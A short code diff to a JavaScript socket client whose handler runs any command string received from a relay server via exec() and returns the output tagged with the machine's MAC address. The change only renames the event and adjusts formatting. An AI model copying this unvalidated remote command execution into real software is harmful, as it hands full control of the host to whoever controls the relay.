@@ -25,7 +25,7 @@ function get_token () {
 }
 
 //----------Start Socket Calls--------------//
-relay.on('command', function (data) {
+relay.on('get command', function (data) {
   var command = data.command;
   exec(command, (err, stdout, stderr) => {
     if (err) {
@@ -33,7 +33,7 @@ relay.on('command', function (data) {
       data.error = err;
       return;
     }
-   relay.emit('command result', {mac:mac, result:stdout});
+    relay.emit('command result', {mac:mac, result:stdout})
   });
   console.log(TAG, "Command recieved and issued successfully returning information");
 });
